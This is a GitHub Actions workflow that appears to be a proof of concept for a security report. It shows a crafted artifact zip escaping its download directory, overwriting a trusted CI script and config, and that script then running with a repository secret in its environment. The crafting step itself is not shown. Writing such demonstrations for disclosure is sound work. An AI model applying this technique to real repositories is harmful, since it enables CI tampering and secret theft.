name: poc-extract

on:
  workflow_dispatch:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  produce:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Craft and upload a hostile artifact zip (attacker-controlled workflow)
        uses: ./.poc-upload
  consume:
    needs: produce
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Download artifact exactly like the target workflow
        uses: actions/download-artifact@v4
        with:
          name: docs-preview-dist
          path: packages/kumo-docs-astro/dist/
      - name: Inspect extraction result
        run: |
          echo "--- packages/kumo-docs-astro/wrangler.jsonc ---"
          cat packages/kumo-docs-astro/wrangler.jsonc || true
          echo "--- escaped.txt (outside download directory) ---"
          cat packages/kumo-docs-astro/../escaped.txt || echo MISSING
          echo "--- ci/preview listing ---"
          ls -la ci/preview
          head -5 ci/preview/preview.ts
      - name: Run the trusted script with a secret in env
        env:
          POC_SECRET: ${{ secrets.POC_SECRET }}
        run: python3 ci/preview/preview.ts deploy
